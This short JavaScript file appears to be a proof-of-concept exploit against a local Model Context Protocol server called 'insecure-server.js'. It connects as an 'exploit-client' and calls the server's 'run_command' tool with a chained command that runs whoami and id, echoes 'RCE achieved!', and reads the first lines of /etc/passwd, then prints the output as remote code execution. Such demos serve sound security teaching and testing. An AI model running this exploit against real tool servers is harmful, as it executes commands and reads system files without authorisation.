import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const transport = new StdioClientTransport({
  command: "node",
  args: ["insecure-server.js"],
});

const client = new Client(
  { name: "exploit-client", version: "1.0.0" },
  { capabilities: {} }
);

await client.connect(transport);

const result = await client.callTool({
  name: "run_command",
  arguments: {
    command: "whoami && id && echo 'RCE achieved!' && cat /etc/passwd | head -2",
  },
});

console.log("=== RCE OUTPUT ===");
console.log(result.content[0].text);
await client.close();
